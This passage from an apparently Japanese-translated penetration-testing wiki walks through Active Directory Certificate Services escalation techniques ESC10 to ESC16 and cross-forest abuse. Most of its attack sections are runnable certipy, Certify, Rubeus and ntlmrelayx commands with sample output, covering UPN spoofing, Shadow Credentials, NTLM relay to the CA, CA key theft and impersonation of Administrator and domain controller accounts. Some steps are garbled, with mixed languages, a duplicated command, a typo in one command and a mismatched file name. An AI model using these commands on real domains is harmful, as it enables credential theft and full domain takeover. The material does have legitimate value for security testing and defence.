- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` の `StrongCertificateBindingEnforcement` のデフォルト設定は `1`、以前は `0` でした。

**ケース 1**

`StrongCertificateBindingEnforcement` が `0` に設定されている場合。

**ケース 2**

`CertificateMappingMethods` に `UPN` ビット (`0x4`) が含まれている場合。

### 悪用ケース 1

`StrongCertificateBindingEnforcement` が `0` に設定されている場合、`GenericWrite` 権限を持つアカウント A は任意のアカウント B を侵害するために悪用できます。

例えば、`Jane@corp.local` に対して `GenericWrite` 権限を持っている攻撃者が `Administrator@corp.local` を侵害することを狙う場合、手順は ESC9 と同様で、任意の certificate template を利用できます。

まず、`GenericWrite` を悪用して `Shadow Credentials` を使い、`Jane` の hash を取得します。
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
その後、`Jane`の`userPrincipalName`は制約違反を回避するため、`@corp.local`の部分を意図的に省略して`Administrator`に変更されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
続いて、デフォルトの `User` テンプレートを使用して、クライアント認証を有効にする証明書が `Jane` として要求されます。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`の`userPrincipalName`は元の`Jane@corp.local`に戻されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
取得した証明書で認証すると `Administrator@corp.local` の NT hash が得られます。証明書にドメイン情報が含まれていないため、コマンドでドメインを指定する必要があります。
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

`CertificateMappingMethods` に `UPN` ビットフラグ (`0x4`) が含まれている場合、`GenericWrite` 権限を持つアカウント A は、`userPrincipalName` プロパティを持たない任意のアカウント B（マシンアカウントや組み込みのドメイン管理者である `Administrator` を含む）を侵害できます。

ここでは、`GenericWrite` を活用して Shadow Credentials を通じて `Jane` のハッシュを取得することから始め、`DC$@corp.local` を侵害することを目的とします。
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`の`userPrincipalName`は`DC$@corp.local`に設定されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
デフォルトの `User` テンプレートを使用して、`Jane` としてクライアント認証用の証明書が要求されます。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`の`userPrincipalName`はこのプロセスの後、元に戻されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel を介して認証するために、Certipy の `-ldap-shell` オプションが使用され、認証が成功すると `u:CORP\DC$` と表示されます。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAPシェルを通じて、`set_rbcd` のようなコマンドは Resource-Based Constrained Delegation (RBCD) 攻撃を可能にし、domain controller が侵害される可能性がある。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
この脆弱性は `userPrincipalName` を欠く、または `sAMAccountName` と一致しない任意のユーザーアカウントにも及びます。デフォルトの `Administrator@corp.local` は、LDAP の特権が高く、デフォルトで `userPrincipalName` が存在しないため、主要な標的となります。

## Relaying NTLM to ICPR - ESC11

### 説明

If CA Server Do not configured with `IF_ENFORCEENCRYPTICERTREQUEST`, it can be makes NTLM relay attacks without signing via RPC service. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

`certipy` を使用して `Enforce Encryption for Requests` が Disabled かどうかを列挙でき、certipy は `ESC11` 脆弱性を表示します。
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### 悪用シナリオ

リレーサーバーをセットアップする必要がある:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
注: ドメインコントローラーの場合、DomainController で `-template` を指定する必要があります。

または、[sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### 説明

管理者は Certificate Authority を "Yubico YubiHSM2" のような外部デバイスに格納するように設定できます。

CA サーバーに USB ポート経由で USB デバイスが接続されている場合、または CA サーバーが仮想マシンで USB device server を介して接続されている場合、Key Storage Provider が YubiHSM 内でキーを生成および利用するために認証キー（しばしば「password」と呼ばれる）が必要です。

このキー/パスワードはレジストリの `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` にプレーンテキストで保存されます。

参照: [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### 悪用シナリオ

CA の秘密鍵が物理的な USB デバイスに保存されており、あなたが shell access を得た場合、その鍵を回収することが可能です。

まず、CA 証明書（これは公開情報です）を入手し、次に:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
最後に、certutil `-sign` コマンドを使って、CA 証明書とその秘密鍵を用いて任意の新しい証明書を偽造します。

## OID Group Link Abuse - ESC13

### 説明

`msPKI-Certificate-Policy` 属性は、証明書テンプレートに発行ポリシーを追加できるようにします。ポリシーの発行を担当する `msPKI-Enterprise-Oid` オブジェクトは、PKI OID コンテナの Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) で見つけることができます。ポリシーはこのオブジェクトの `msDS-OIDToGroupLink` 属性を使って AD グループにリンクでき、システムはその証明書を提示するユーザーをまるでそのグループのメンバーであるかのように認可できます。[Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

つまり、ユーザーが証明書を登録する権限を持ち、その証明書が OID グループにリンクされている場合、ユーザーはそのグループの権限を継承できます。

OIDToGroupLink を見つけるには [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) を使用します:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### 悪用シナリオ

利用できるユーザー権限を見つけるには `certipy find` または `Certify.exe find /showAllPermissions` を使用する。

もし `John` が `VulnerableTemplate` に enroll する権限を持っていれば、ユーザーは `VulnerableGroup` グループの権限を継承できる。

テンプレートを指定するだけで、OIDToGroupLink 権限を持つ証明書が取得できる。
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## 脆弱な証明書更新構成 - ESC14

### 説明

説明は https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping に非常に詳しく記載されています。以下は元のテキストの引用です。

ESC14 は主に Active Directory のユーザーまたはコンピュータアカウント上の `altSecurityIdentities` 属性の誤用や不適切な構成に起因する「弱い explicit certificate mapping」による脆弱性に対処します。この multi-valued 属性は、管理者が X.509 証明書を認証目的で AD アカウントに手動で紐付けることを可能にします。値が設定されると、これらの明示的なマッピングは通常、証明書の SAN 内の UPN や DNS 名、または `szOID_NTDS_CA_SECURITY_EXT` セキュリティ拡張に埋め込まれた SID に基づくデフォルトの証明書マッピングロジックを上書きすることがあります。

「弱い」マッピングは、`altSecurityIdentities` 属性内で証明書を識別するために使用される文字列値が広すぎる、容易に推測可能である、一意でない証明書フィールドに依存している、または簡単に偽装可能な証明書コンポーネントを使用している場合に発生します。攻撃者が特権アカウントのそのような弱く定義された explicit mapping に一致する属性を持つ証明書を取得または作成できれば、その証明書を使ってそのアカウントとして認証・なりすましを行うことができます。

潜在的に弱い `altSecurityIdentities` マッピング文字列の例には以下が含まれます：

- 共通 Subject Common Name (CN) のみでマッピングする：例 `X509:<S>CN=SomeUser`。攻撃者はこの CN を持つ証明書をよりセキュアでないソースから入手できる可能性があります。
- シリアル番号や subject key identifier のような追加の限定がない過度に一般的な Issuer Distinguished Name (DN) や Subject DN の使用：例 `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`。
- 攻撃者が正当に入手または偽造できる（CA を侵害したり ESC1 のような脆弱なテンプレートを見つけた場合など）証明書で満たせる、予測可能なパターンや非暗号的識別子の使用。

`altSecurityIdentities` 属性はマッピングに対して様々な形式をサポートしています。例えば：

- `X509:<I>IssuerDN<S>SubjectDN` （Issuer および Subject の完全な DN によってマッピング）
- `X509:<SKI>SubjectKeyIdentifier` （証明書の Subject Key Identifier 拡張値によってマッピング）
- `X509:<SR>SerialNumberBackedByIssuerDN` （シリアル番号でマッピング、暗黙的に Issuer DN によって限定される）- これは標準形式ではなく、通常は `<I>IssuerDN<SR>SerialNumber` のようになります。
- `X509:<RFC822>EmailAddress` （SAN の RFC822 名、通常はメールアドレスによってマッピング）
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` （証明書の生の公開鍵の SHA1 ハッシュでマッピング - 一般に強力）

これらのマッピングのセキュリティは、マッピング文字列で選択される証明書識別子の特異性、一意性、および暗号学的強度に大きく依存します。Domain Controllers 上で強力な certificate binding モードが有効になっていても（これは主に SAN の UPN/DNS や SID 拡張に基づく暗黙的マッピングに影響します）、`altSecurityIdentities` エントリが不適切に構成されていると、マッピングロジック自体が欠陥または過度に許容的である場合に直接的ななりすましの経路を提供する可能性があります。

### Abuse Scenario

ESC14 は Active Directory (AD) の explicit certificate mappings、特に `altSecurityIdentities` 属性を標的とします。この属性が設定されている（設計上または誤設定で）場合、攻撃者はマッピングに一致する証明書を提示することでアカウントになりすますことができます。

#### Scenario A: Attacker Can Write to `altSecurityIdentities`

**前提条件**：攻撃者がターゲットアカウントの `altSecurityIdentities` 属性に書き込み権限を持っている、またはターゲット AD オブジェクトに対して以下のいずれかの権限を持つことでそれを付与できること：
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)

- **前提条件**：ターゲットが altSecurityIdentities に弱い X509RFC822 マッピングを持っている。攻撃者は被害者の mail 属性をターゲットの X509RFC822 名に一致させるよう設定し、被害者として証明書を登録(enroll)して、その証明書を使ってターゲットとして認証することができる。

#### Scenario C: Target Has X509IssuerSubject Mapping

- **前提条件**：ターゲットが `altSecurityIdentities` に弱い X509IssuerSubject 明示的マッピングを持っている。攻撃者は被害者プリンシパルの `cn` または `dNSHostName` 属性をターゲットの X509IssuerSubject マッピングの subject に一致させるよう設定できる。次に、攻撃者は被害者として証明書を登録し、この証明書を使ってターゲットとして認証できる。

#### Scenario D: Target Has X509SubjectOnly Mapping

- **前提条件**：ターゲットが `altSecurityIdentities` に弱い X509SubjectOnly 明示的マッピングを持っている。攻撃者は被害者プリンシパルの `cn` または `dNSHostName` 属性をターゲットの X509SubjectOnly マッピングの subject に一致させるよう設定できる。次に、攻撃者は被害者として証明書を登録し、この証明書を使ってターゲットとして認証できる。

### 具体的な操作

#### Scenario A

証明書テンプレート `Machine` の証明書を要求する
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
証明書を保存して変換する
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
認証する（証明書を使用して）
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
クリーンアップ（任意）
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
For more specific attack methods in various attack scenarios, please refer to the following: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu アプリケーションポリシー(CVE-2024-49019) - ESC15

### 説明

The description at https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc is remarkably thorough. Below is a quotation of the original text.

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### 悪用

The following is referenced to [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu), 詳細な使用方法はクリックしてご覧ください。

Certipy's `find` command can help identify V1 templates that are potentially susceptible to ESC15 if the CA is unpatched.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### シナリオ A: Direct Impersonation via Schannel

**ステップ 1: 証明書を要求し、"Client Authentication" Application Policy とターゲット UPN を注入します。** 攻撃者 `attacker@corp.local` は `administrator@corp.local` を "WebServer" V1 テンプレート（enrollee-supplied subject を許可）を使用して標的にします。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: 脆弱な V1 テンプレートで、"Enrollee supplies subject" が有効になっています。
- `-application-policies 'Client Authentication'`: CSR の Application Policies 拡張に OID `1.3.6.1.5.5.7.3.2` を注入します。
- `-upn 'administrator@corp.local'`: SAN に UPN を設定してなりすましを行います。

**ステップ 2: 取得した証明書を使用して Schannel (LDAPS) 経由で認証します。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### シナリオB: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Step 1: V1 template（"Enrollee supplies subject" を使って）から証明書を要求し、"Certificate Request Agent" Application Policy を注入します。** この証明書は攻撃者（`attacker@corp.local`）が enrollment agent になるためのものです。目的が agent としての機能であるため、攻撃者自身の UPN はここでは指定されていません。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` を注入します。

**Step 2: Use the "agent" certificate to request a certificate on behalf of a target privileged user.** これは ESC3 のようなステップで、ステップ1の証明書を "agent" 証明書として使用します。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**ステップ3: "on-behalf-of" 証明書を使用して特権ユーザーとして認証する。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CAでのSecurity Extensionが無効（グローバル）-ESC16

### 説明

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** は、AD CS の設定がすべての証明書に **szOID_NTDS_CA_SECURITY_EXT** 拡張の挿入を強制しない場合に発生する状況を指し、攻撃者はこれを以下の方法で悪用できます：

1. 証明書を**without SID binding**で要求する。
2. この証明書を**for authentication as any account**として使用し、例えば高権限アカウント（例：Domain Administrator）を偽装する。

詳細な原理については次の記事も参照してください：https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### 悪用

以下は [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) を参照しています。詳細な使用方法はクリックしてご覧ください。

Active Directory Certificate Services (AD CS) 環境が **ESC16** に対して脆弱かどうかを識別するには
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**ステップ 1: 被害者アカウントの初期 UPN を読み取る (任意 - 復元用).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**ステップ 2: 被害者アカウントの UPN をターゲット管理者の `sAMAccountName` に更新する。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**ステップ 3: (必要なら) "victim" account の credentials を取得する (例: Shadow Credentials を介して).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Step 4: Request a certificate as the "victim" user from _任意の適切なクライアント認証テンプレート_ (e.g., "User") on the ESC16-vulnerable CA.** CA が ESC16 に脆弱なため、テンプレートの該当拡張設定に関係なく、発行される証明書から自動的に SID セキュリティ拡張が省略されます。Kerberos のクレデンシャルキャッシュ環境変数を設定します（シェルコマンド）:
```bash
export KRB5CCNAME=victim.ccache
```
次に証明書を要求する:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**ステップ5: "victim" アカウントの UPN を元に戻す。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**ステップ6: ターゲットの管理者として認証する。**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## 証明書によるフォレストの侵害（受動態での説明）

### 侵害された CA によってフォレストの信頼が破壊される

**cross-forest enrollment** の構成は比較的単純に設定される。リソースフォレストの **root CA certificate** は管理者によって **published to the account forests** され、リソースフォレストの **enterprise CA** 証明書は各アカウントフォレストの **`NTAuthCertificates` and AIA containers in each account forest** に **added** される。つまり、この構成により、リソースフォレストの **CA in the resource forest complete control** が他の PKI を管理するすべてのフォレストに対して与えられることになる。もしこの CA が **compromised by attackers** と、リソースフォレストおよびアカウントフォレスト両方のすべてのユーザーの証明書が **forged by them** され得るため、フォレストのセキュリティ境界が破壊されることになる。

### 外部プリンシパルに付与されるエンロール権限

マルチフォレスト環境では、Enterprise CAs が **publish certificate templates** して **Authenticated Users or foreign principals**（Enterprise CA が属するフォレストの外部にあるユーザー／グループ）に **enrollment and edit rights** を許可している場合に注意が必要とされる。\
トラストを越えた認証が行われると、**Authenticated Users SID** が AD によってユーザーのトークンに追加される。したがって、あるドメインが **allows Authenticated Users enrollment rights** を有するテンプレートを持つ Enterprise CA を保有している場合、そのテンプレートは別のフォレストのユーザーによって **enrolled in by a user from a different forest** され得る。同様に、テンプレートによって **enrollment rights are explicitly granted to a foreign principal by a template** 場合、**cross-forest access-control relationship is thereby created** され、一方のフォレストのプリンシパルが別のフォレストのテンプレートに **enroll in a template from another forest** できるようにされる。

どちらのシナリオでも、フォレスト間での **increase in the attack surface** が引き起こされる。証明書テンプレートの設定は攻撃者によって悪用され、外部ドメインで追加の特権が取得される可能性がある。

## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
